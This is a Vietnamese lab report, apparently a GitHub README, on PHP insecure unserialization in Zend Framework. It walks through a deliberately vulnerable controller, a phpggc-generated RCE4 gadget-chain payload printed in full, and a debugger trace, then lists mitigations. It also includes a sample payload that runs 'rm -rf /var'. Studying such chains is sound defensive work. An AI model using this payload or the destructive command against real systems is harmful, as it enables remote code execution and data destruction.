# 🛠️ Phân tích một gadget chain với lỗ hổng PHP Insercure Unserialization ⛓️

## Mục Lục

- [1. Giới thiệu chung](#1-giới-thiệu-chung)
- [2. Tổng quan về lỗ hổng](#2-tổng-quan-về-lỗ-hổng)
- [3. Tổng quan về Zend Framework](#3-tổng-quan-về-zend-framework)
- [4. Xây dựng webpage chứa lỗ hổng](#4-xây-dựng-webpage-chứa-lỗ-hổng)
  - [4.1. Mục tiêu](#41-mục-tiêu)
  - [4.2. Công nghệ sử dụng](#42-công-nghệ-sử-dụng)
  - [4.3. Đoạn mã gây ra lỗ hổng](#43-đoạn-mã-gây-ra-lỗ-hổng)
  - [4.4. Quá trình khai thác](#44-quá-trình-khai-thác)
- [5. Phân tích Gadget chain](#5-phân-tích-gadget-chain)
  - [5.1. Khái niệm Gadget chain](#51-khái-niệm-gadget-chain)
  - [5.2. Phân tích cụ thể](#52-phân-tích-cụ-thể)
  - [5.3. Debug trực tiếp trên ứng dụng](#53-debug-trực-tiếp-trên-ứng-dụng)
- [6. Một số biện pháp phòng tránh lỗ hổng](#6-một-số-biện-pháp-phòng-tránh-lỗ-hổng)

## 1. Giới thiệu chung
`Insecure Unserialization` hay `Object Injection` là một lỗ hổng phổ biến trong PHP, xảy ra khi dữ liệu không đáng tin cậy được truyền trực tiếp vào hàm `unserialize()` mà không có kiểm soát hoặc xác thực. Khi đó, kẻ tấn công có thể chèn vào chuỗi dữ liệu các đối tượng được thiết kế đặc biệt `(gadget)` để khai thác các `magic method` như `__wakeup()` hay `__destruct()`, từ đó dẫn đến thực thi mã tùy ý `(RCE – Remote Code Execution)`.

Một ví dụ điển hình là lỗ hổng từng tồn tại trong `Zend Framework` (trước phiên bản `1.12.20`), nơi mà một số class trong framework có thể bị lợi dụng để xây dựng `gadget chain`, tạo điều kiện cho tấn công khi dữ liệu đầu vào bị `unserialize` một cách không an toàn.

Mục tiêu của project này là mô phỏng lại quá trình khai thác thông qua việc xây dựng một webpage mẫu chứa lỗ hổng trên `Zend Framework`, tạo payload bằng công cụ `phpggc`, debug theo luồng `gadget chain`, và cuối cùng là phân tích cũng như đưa ra một số cách phòng chống hiệu quả lỗ hổng này trong thực tế phát triển phần mềm.
## 2. Tổng quan về lỗ hổng Insecure Unserialization trên PHP
Trong PHP, `serialize()` và `unserialize()` là hai hàm dùng để tuần tự hóa và khôi phục các đối tượng hoặc cấu trúc dữ liệu phức tạp. Tuy nhiên, nếu dữ liệu được truyền vào `unserialize()` đến từ nguồn không tin cậy, không được kiểm soát hay xác thực phù hợp (như đầu vào từ người dùng), nó có thể bị lợi dụng để thực hiện hành vi tấn công.

Lỗ hổng `nsecure Unserialization` xảy ra khi dữ liệu đã bị kẻ tấn công kiểm soát được `unserialize` mà không có kiểm tra nghiêm ngặt. Bằng cách tạo ra một chuỗi `(chain)` tuần tự hóa chứa các đối tượng đặc biệt `(gadget)`, kẻ tấn công có thể lợi dụng các phương thức "ma thuật" - `magic method` trong PHP như: `__construct()`, `__destruct()`, `__wakeup()`, `__toString()`,...

Trong chuỗi `gadget chain`, các đối tượng được sắp xếp sao cho khi `unserialize` xảy ra, các phương thức nguy hiểm sẽ được gọi một cách tự động và tuần tự, dẫn đến việc kẻ tấn câng thực hiện các loại tấn công khác nhau, chẳng hạn như Code Injection, SQL Injection, Path Traversal, DDoS,...

Ví dụ điển hình về payload có thể chứa nội dung như sau:
```php 
O:8:"Exploit":1:{s:4:"data";s:13:"rm -rf /var";}
```
Khi unserialize chuỗi trên, nếu class Exploit có chứa `__destruct()` thực hiện `system($this->data)`, thì dòng lệnh sẽ được thực thi ngay lập tức.

Các lỗ hổng này thường rất nguy hiểm do chúng khó bị phát hiện bằng mắt thường và có thể dẫn đến toàn quyền kiểm soát máy chủ nếu không được xử lý đúng cách.

## 3. Tổng quan về Zend Framework
`Zend Framework` là một framework mã nguồn mở mạnh mẽ và phổ biến được dùng để xây dựng các ứng dụng web PHP theo kiến trúc MVC (Model–View–Controller). Với thiết kế hướng đối tượng và hỗ trợ mở rộng, Zend cung cấp nhiều class tiện ích cho việc xử lý log, email, cấu hình, layout,...Tuy nhiên, chính sự đa dạng và phức tạp này cũng tạo điều kiện cho việc hình thành các `gadget chain` nếu không kiểm soát cẩn thận việc tuần tự hóa đối tượng.

Trước phiên bản `1.12.20`, `Zend Framework` tồn tại các lớp như:

`Zend_Log`: hỗ trợ ghi log linh hoạt.

`Zend_Mail`: xử lý gửi email.

`Zend_Config`: quản lý cấu hình theo file hoặc mảng.

`Zend_View` và `Zend_Layout`: hỗ trợ tạo giao diện người dùng động.

Các lớp này có thể bị xâu chuỗi lại với nhau nhờ các phương thức `__destruct()`, `__call()` và `__toString()` để tạo thành một gadget chain nguy hiểm, cho phép kẻ tấn công lợi dụng để thực thi lệnh hệ thống thông qua `unserialize`.

Zend sau đó đã phát hành bản vá trong phiên bản `1.12.20`, loại bỏ hoặc điều chỉnh các hành vi nguy hiểm trong các `magic method`, đồng thời khuyến cáo không nên `unserialize` dữ liệu không đáng tin cậy.
## 4. Xây dựng webpage chứa lỗ hổng
### 4.1. Mục tiêu
Xây dựng một webpage sử dụng `Zend Framework` chứa đoạn mã có đối tượng được `unserialize()` mà không qua xác thực. Sau đó tiến hành khai thác lỗ hổng `Insecure Unserialization` trên trang web này sử dụng payload tạo từ công cụ `phpggc`.
### 4.2. Công nghệ sử dụng
- Language: `PHP 7.2.3` .
- Framework: `ZendFramework 1.12.20`.
- Server: `Apache 2.4.46 (XAMPP 8.2.4)`.
- Debugger-extension: `Xdebug 3.1.6`.
- IDE: `PHPStorm 2024.3.1.1`.
- Environment: `Localhost`.
### 4.3. Đoạn mã gây ra lỗ hổng
Để nghiên cứu và mô phỏng lỗ hổng `PHP Insecure Unserialization` trên `Zend Framework`, báo cáo xây dựng một đoạn mã thử nghiệm đơn giản như sau:
```php
<?php

class IndexController extends Zend_Controller_Action
{
    public function indexAction()
    {
        if ($this->getRequest()->isPost()) {
            $username = $this->getRequest()->getPost('username');
            $password = $this->getRequest()->getPost('password');

            $data = base64_decode($username);
            @unserialize($data); 
        }

        // Hiển thị form HTML...
    }
}
```
*📌 Lưu ý: Đây là một đoạn mã giả lập, có thể không xuất hiện trong ứng dụng thực tế. Mục đích là tái hiện một trang web cho phép nhập đầu vào nguy hiểm dẫn dến việc giải tuần tự dữ liệu không đáng tin cậy — từ đó phân tích sự hoạt động của gadget chain khi được thực thi.*

- Ứng dụng nhận dữ liệu username từ người dùng thông qua phương thức POST.

- Dữ liệu này được `base64_decode()` rồi truyền trực tiếp vào `unserialize()` mà không qua bất kỳ kiểm tra hay xác thực nào.

- Dòng `@unserialize($data);` chính là điểm dễ bị tấn công, đặc biệt nếu dữ liệu gửi đến là một chuỗi gadget chain được xây dựng phục vụ mục đích khai thác.
### 4.4. Quá trình khai thác
#### 4.4.1. Tạo payload
Để tạo payload khai thác lỗ hổng trên trang web được dựng ở trên, sử dụng công cụ [`Phpggc`](https://github.com/ambionics/phpggc). Công cụ này hỗ trợ sẵn rất nhiều `gadget chains` được trích xuất từ các thư viện và framework phổ biến như `Zend Framework`, `Laravel`, `Monolog`, `SwiftMailer`,…
Sử dụng lệnh sau để tạo payload từ gadget chain để khai thác lỗ hổng:
```bash
phpggc zendframework/rce4 'system("start calc");' | base64
```
- `zendframework/rce4`: Tên của `gadget chain` đã được định nghĩa trong phpggc, thực nghiệm sử dụng rce4 trên Zend Framework.

- `system("start calc")`: Lệnh hệ thống sẽ được thực thi nếu khai thác thành công, ở đây là lệnh khởi động calculator trên Windows .

- `base64`: Mã hóa đầu ra để phù hợp với xử lý đầu vào trong đoạn mã thử nghiệm (giải mã bằng `base64_decode` trước khi `unserialize`).

Payload được tạo ra dưới dạng base64 như sau: 

<p align="center">
  <img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Phpggc_payload.png?raw=true" alt="Phpggc_payload" width="800"/>
    <p align="center"><em>Payload được tạo bằng phpggc</em></p>
</p>

#### 4.4.2. Nhập payload khai thác
Nhập payload khai thác vào index webpage trên Zend Framework đã được giới thiệu trong phần 4.3.

<p align="center">
  <img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Zend_index.png?raw=true" width="800"/>
    <p align="center"><em>Giao diện index Webpage</em></p>
</p>

Vì hàm `unserialize()` giải tuần tự hóa trực tiếp dữ liệu từ trường `username`, tiến hành chèn trực tiếp payload vào trường này: 

<p align="center">
  <img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Zend_index_payload.png?raw=true"  width="800"/>
    <p align="center"><em>Nhập payload</em></p>
</p>

Khi payload chạy thành công, lệnh chèn vào được thực thi, ở đây là mở `calculator`

<p align="center">
  <img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Zend_index_calc.png?raw=true" alt="Phpggc_payload" width="800"/>
    <p align="center"><em>Payload thực thi thành công, calculator được khởi động</em></p>
</p>

## 5. Phân tích Gadget chain
### 5.1. Khái niệm Gadget chain
`Gadget chain` là một chuỗi các class và method có sẵn trong mã nguồn của một ứng dụng hoặc thư viện, mà khi được sắp xếp và kết hợp đúng cách thông qua quá trình `unserialize()`, sẽ dẫn đến hành vi nguy hiểm như thao túng luồng xử lý của ứng dụng dẫn đến RCE hay các lỗ hổng khác.

Kẻ tấn công không cần tạo mã độc mới, mà chỉ cần tận dụng các đoạn mã có sẵn (gadget) và xây dựng chúng thành một chuỗi hoạt động độc hại.

### 5.2. Phân tích cụ thể
Các gadget được chuẩn bị sẵn lấy từ mã nguồn `phpggc`: 
```php
<?php

class Zend_Log
{
    protected $_writers;

    function __construct($x)
    {
        $this->_writers = $x;
    }
}

class Zend_Log_Writer_Mail
{
    protected $_eventsToMail;
    protected $_layoutEventsToMail;
    protected $_mail;
    protected $_layout;
    protected $_subjectPrependText;

    public function __construct(
        $eventsToMail,
        $layoutEventsToMail,
        $mail,
        $layout
    ) {
        $this->_eventsToMail       = $eventsToMail;
        $this->_layoutEventsToMail = $layoutEventsToMail;
        $this->_mail               = $mail;
        $this->_layout             = $layout;
        $this->_subjectPrependText = null;
    }
}

class Zend_Mail
{
}

class Zend_Layout
{
    protected $_inflector;
    protected $_inflectorEnabled;
    protected $_layout;

    public function __construct(
        $inflector,
        $inflectorEnabled,
        $layout
    ) {
        $this->_inflector        = $inflector;
        $this->_inflectorEnabled = $inflectorEnabled;
        $this->_layout           = '){}' . $layout . '/*';
    }
}

class Zend_Filter_Callback
{
    protected $_callback = "create_function";
    protected $_options = [""];
}

class Zend_Filter_Inflector
{
    protected $_rules = [];

    public function __construct()
    {
        $this->_rules['script'] = [new Zend_Filter_Callback()];
    }
}
```

Còn đây là chain để kết nối các gadget trên:
```php
<?php

namespace GadgetChain\ZendFramework;

class RCE4 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '? <= 1.12.20';
    public static $vector = '__destruct';
    public static $author = 'ydyachenko';

    public static $information = '
        - Based on ZendFramework/RCE1
        - Works on PHP >= 7.0.0
    ';

    public function generate(array $parameters)
    {
        return new \Zend_Log(
            [new \Zend_Log_Writer_Mail(
                 [1],
                 [],
                 new \Zend_Mail,
                 new \Zend_Layout(
                     new \Zend_Filter_Inflector(),
                     true,
                     $parameters['code']
                 )
             )]
        );
    }
}
```

Trong đó:
- `Zend_Log`: Là entry point của gadget chain. Lớp này có thuộc tính `_writers`, là một mảng chứa các `writer`. Trong payload, mảng này chứa một đối tượng của `Zend_Log_Writer_Mail`, từ đó chuỗi gadget tiếp tục được kích hoạt.

- `Zend_Log_Writer_Mail`: Là một writer gửi log qua email. Trong gadget chain, class này chứa các thuộc tính như _mail, _layout, _eventsToMail... đặc biệt _layout chính là điểm nối tiếp đến class quan trọng tiếp theo là `Zend_Layout` → nơi dẫn đến thực thi mã PHP.

- `Zend_Layout`: Lớp này dùng để render layout cho view trong Zend. Thuộc tính `_inflector` được truyền vào là một đối tượng của class `Zend_Filter_Inflector`, và quan trọng nhất là `_layout` – là biến được gán giá trị là mã PHP muốn thực thi thông qua khởi tạo từ `$parameters['code']`.

- `Zend_Filter_Inflector`: Đây là lớp có chức năng tạo chuỗi dựa trên các quy tắc lọc. Nó chứa thuộc tính `_rules`, trong đó có thể chứa các `callback function`.

- `Zend_Filter_Callback`: Là lớp chứa thuộc tính `_callback`, mặc định gán là "create_function", và `_options` chứa mảng tham số. Khi callback này được thực thi trong quá trình xử lý inflector, `create_function` sẽ tạo và thực thi đoạn mã PHP.

Gadget chain sau đó được tổng hợp thành một chuỗi được tuần tự hóa (serialized string) theo định dạng của hàm `serialize()` trong PHP:
```php
O:8:"Zend_Log":1:{s:11:"*_writers";a:1:{i:0;O:20:"Zend_Log_Writer_Mail":5:{s:16:"*_eventsToMail";a:1:{i:0;i:1;}s:22:"*_layoutEventsToMail";a:0:{}s:8:"*_mail";O:9:"Zend_Mail":0:
{}s:10:"*_layout";O:11:"Zend_Layout":3:{s:13:"*_inflector";O:21:"Zend_Filter_Inflector":1:{s:9:"*_rules";a:1:{s:6:"script";a:1:{i:0;O:20:"Zend_Filter_Callback":2:
{s:12:"*_callback";s:15:"create_function";s:11:"*_options";a:1:{i:0;s:0:"";}}}}}s:20:"*_inflectorEnabled";b:1;s:10:"*_layout";s:26:"){}system("start calc");/*";}s:22:"*_subjectPrependText";N;}}}
```

Cấu trúc của một chuỗi serialized object gồm:
- `O:<length>:"ClassName":<property_count>:{...}` – đại diện cho một đối tượng.
- `s:<length>:"property_name"` – tên thuộc tính.
- `a:<size>:{...}` – một mảng (array).
- `i:<int>` – số nguyên.
- `s:<length>:"string"` – chuỗi.
- `N` – null.
- `b:0 hoặc b:1` – boolean false hoặc true.

Tổng quát quá trình thực thi:
- Khi đối tượng `Zend_Log` bị gọi hủy (qua `__destruct()`), nó sẽ gọi writer là đối tượng của `Zend_Log_Writer_Mail`.
  
- Writer này lại xử lý layout để format nội dung email, và thông qua chuỗi phụ thuộc (`Zend_Layout → Zend_Filter_Inflector → Zend_Filter_Callback`) sẽ gọi `create_function()` chứa lệnh muốn thực thi.

- Nếu mã này là `system("start calc")`, máy chủ sẽ thực thi lệnh mở `calculator`.

- Chuỗi thực hiện:
```
unserialize()
    └──Zend_Log::__destruct()
            └── Zend_Log_Writer_Mail::shutdown()
                  └── Zend_Layout::render()
                          └── Zend_Filter_Inflector::filter($_layout)
                                    └── Zend_Filter_Callback::filter()
                                                  └── create_function('', ')}{system("start calc");/*')
                                                            └── system("start calc")
```

### 5.3. Debbug trực tiếp trên ứng dụng
#### 🧩 Nhập Payload
Payload được nhập sẽ được giải tuần tự thông qua hàm `unserialize()`.
<p align="center">
  <img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Debug_unserialize.png?raw=true"  width="800"/>
    <p align="center"><em>Payload được unserialize </em></p>
</p>

#### 🧩 Gọi đến Zend_Log::__destruct()
- Như đã đề cập ở trên, sau khi giải tuần tự, `Zend_Log` bị hủy, `destruct()` của class được gọi.

- Đặt break point tại hàm `destruct()` của class `Zend_Log` tại `library/Zend/Log.php`.

<p align="center">
  <img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Debug_destruct.png?raw=true" width="800"/>
    <p align="center"><em>Mã nguồn __destruct() của Zend_Log</em></p>
</p>

- Trong hàm destruct(),  đối tượng `$writer` gọi đến method `shutdown()`

    - Đối chiếu với gadget chain, `$writer` là đối tượng được khởi tạo từ class `Zend_Log_Writer_Mail`.
  
#### 🧩 Gọi đến `Zend_Log_Writer_Mail::shutdown()`
- Hàm `shutdown()` định nghĩa tại class `Zend_Log_Writer_Mail` được extend từ `Zend_Log_Writer_Abstract`.
  
- Trong hàm `shutdown()` để tránh chương trình đi vào nhánh `if (empty($this->_eventsToMail))` và kết thúc hàm này khi chưa đạt được mục đích mong muốn, tại chain trong phpggc, biến `$_eventsToMail` được khởi tạo là một mảng không rỗng (`[1]`).

<p align="center">
  <img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Shutdown_eventToMail.png?raw=true"  width="800"/>
    <p align="center"><em>if (empty($this->_eventsToMail))</em></p>
</p>
  
```php
 [new \Zend_Log_Writer_Mail(
                 [1],
                 [],
                 new \Zend_Mail,
                 new \Zend_Layout(
                     new \Zend_Filter_Inflector(),
                     true,
                     $parameters['code']
                 )
             )]
```

- Sau đó, tại hàm `shutdown()` biến _mail sẽ thực hiện `setBodyHtml` cho email với tham số `_layout->render()`,
    - Trong đó `_layout` trong gadget chain là biến được khởi tạo từ `Zend_Layout` với giá trị `‘){}phpinfo();exit();/*’`. Giá trị này được khởi tạo sau khi payload được `unserialize`.

<p align="center">
  <img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Debug_setBodyHtml.png?raw=true" width="800"/>
    <p align="center"><em>Gọi đến setBodyHtml </em></p>
</p>
  
#### 🧩 Gọi đến Zend_Layout::render()
- Tiếp tục debug vào `render()`, biến `$name` lúc đầu được khởi tạo với giá trị `null`, sau đó biến này được truyền vào giá trị thông qua gọi `$name = $this->getLayout();`

- Hàm `getLayout()` trả về giá trị lưu trong biến `_layout`, giá trị của biến này khi đó đang là `‘){}phpinfo();exit();/*’`, tức là sau khi thoát khỏi getLayout(), biến `name` cũng được gán với giá trị này.

<p align="center">
  <img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Debug_getLayout.png?raw=true" width="800"/>
     <p align="center"><em>Xử lý trong getLayout()</em></p>
</p>

<p align="center">
<img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Debug_%24name.png?raw=true" width="800"/>
     <p align="center"><em>Giá trị $name sau khi qua getLayout()</em></p>
</p>

- Giá trị biến `_inflector` là một đối tượng của `Zend_Filter_Callback`, nó gọi đến `filter()` của `Zend_Filter_Inflector`.
    - Giá trị truyền vào `filter()` là một mảng `['script' => $name]` với key là `"script"` và value là giá trị trong biến `$name`

<p align="center">
<img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Debug_fillter.png?raw=true" width="800"/>
    <p align="center"><em>Đoạn mã gọi đến filter() của Zend_Filter_Inflector </em></p>
</p>

#### 🧩 Gọi đến Zend_Filter_Inflector::filter()
- Giá trị truyền vào sau đó được lưu trong biến `$source`.
  
- Sau khi sử lý trong hàm `filter()` của class `Zend_Filter_Inflector`, giá trị ứng với key `"script"` của biến `$source` được gán cho biến `$processedPart`, lúc này giá trị của $processedPart sẽ là `){}system("start calc");/*`

<p align="center">
<img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/ProcessPart.png?raw=true" width="800"/>
    <p align="center"><em>$processedPart</em></p>
</p>
  
- Sau đó từ `$ruleFilter` gọi đến `filter($processedPart)`, mà lúc này `$ruleFilter` đang là một đối tượng của `Zend_Filter_Callback`, vì vậy `Zend_Filter_Callback::filter()` được gọi với giá trị đầu vào là biến `$processedPart` (hay lúc này đang có giá trị là `){}system("start calc");/*`)

<p align="center">
<img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Debug_fillter2.png?raw=true" width="800"/>
    <p align="center"><em>Đoạn mã gọi đến filter() của Zend_Filter_Callback </em></p>
</p>

#### 🧩 Gọi đến Zend_Filter_Callback::filter()
- Tại đây, "`){}system("start calc");/*`" được gán với `$value`
  
- Giá trị trong `$value` sau đó được chèn vào đầu mảng `options` thông qua hàm `array_unshift()`
  
- Cuối cùng hàm return `call_user_func_array($this->_callback, $options)` được gọi, với:
    - `$this->_callback` được khởi tạo trong gadget chain với giá trị là "`create_function`"
    - `$options` là mảng giá trị chứa payload : `){}system("start calc");/*`
  
  - Với các giá trị như trên đoạn code sẽ thực hiện chạy hàm `create_function()` với tham số là `){}system("start calc");/*`. Kết quả là một function sẽ được tạo và lệnh khởi động calculator được gọi sẽ được gọi, dấu /* thực hiện comment các phần còn lại của code. Kết quả đoạn code được truyền vào được thực thi:

<p align="center">
<img src="https://github.com/gnaohuv/zend-demo-php-deserialization/blob/main/images/Call_user_func.png?raw=true" width="800"/>
    <p align="center"><em>Hàm call_user_func_array() được gọi </em></p>
</p>

## 6. Một số biện pháp phòng tránh lỗ hổng 
Lỗ hổng `PHP Insecure Unserialization` xảy ra khi dữ liệu không đáng tin cậy (user-controlled) được `unserialize()` trực tiếp hoặc gián tiếp (ví dụ như thông qua các hàm filter, callback, dynamic class loading...) mà không kiểm tra, không kiểm soát.
### 6.1. Không `unserialize()` dữ liệu từ nguồn không tin cậy
- Chỉ thực hiện `unserialize()` với dữ liệu do chính hệ thống tạo ra và lưu trữ, ví dụ như từ database nội bộ.
  
- Không bao giờ `unserialize()` dữ liệu lấy trực tiếp từ người dùng (các tham số `GET`, `POST`, `COOKIE`, `file upload`, v.v).
  
- Nếu buộc phải nhận dữ liệu bên ngoài, cần có cơ chế kiểm tra chữ ký số (digital signature) để đảm bảo tính toàn vẹn.
### 6.2. Sử dụng các phương pháp thay thế an toàn hơn
- Thay vì dùng `serialize()` và `unserialize()`, nên sử dụng các định dạng trao đổi dữ liệu an toàn hơn như JSON (`json_encode()` và `json_decode()`).
  
- `JSON` chỉ hỗ trợ kiểu dữ liệu đơn giản (`array`, `string`, `int`...) và không tự động tạo ra đối tượng thực thi, giúp giảm thiểu rủi ro chèn mã độc.
### 6.3. Giới hạn các class được phép unserialize (PHP 7+)
- Từ PHP 7 trở lên, `unserialize()` hỗ trợ tham số `allowed_classes`, cho phép chỉ định rõ các class hợp lệ.

- Nếu dữ liệu `unserialize` chứa một class ngoài danh sách này, PHP sẽ chuyển nó thành `__PHP_Incomplete_Class`, tránh kích hoạt mã nguy hiểm.

- Ví dụ:
  ```php
  $safeData = unserialize($input, ["allowed_classes" => ["AllowedClass1", "AllowedClass2"]]);

  ```
### 6.4. Thường xuyên cập nhật framework, PHP và thư viện
- Các framework như `Zend Framework`, `Symfony`, `Laravel`,... có thể chứa gadget-chain nguy hiểm. Việc cập nhật thường xuyên giúp vá các lỗ hổng đã biết.

- Đồng thời cập nhật phiên bản PHP lên bản ổn định mới nhất để hạn chế các nguy cơ bảo mật trong core PHP.

### 6.5. Rà soát mã nguồn định kỳ để phát hiện các điểm yếu
- Tổ chức kiểm tra mã nguồn (code audit) để tìm ra các vị trí dùng `unserialize()` và đánh giá độ an toàn.

- Sử dụng các công cụ tự động như `PHPStan`, `Psalm`, `RIPS` hoặc `SonarQube` để phát hiện các đoạn code nguy hiểm tiềm tàng.

## 👉Kết Luận
Bài báo cáo với đề tài `Phân tích một gadget chain với lỗ hổng PHP Insercure Unserialization` đã đưa ra phân tích tổng quát về lỗ hổng này, hướng dẫn xây dựng môi trường để thử nghiệm khai thác lỗ hổng, phân tích `gadget chain` để hiểu rõ luồng hoạt động và cuối cùng là đưa ra một số biện pháp phòng tránh lỗ hổng `PHP Insercure Unserialization`



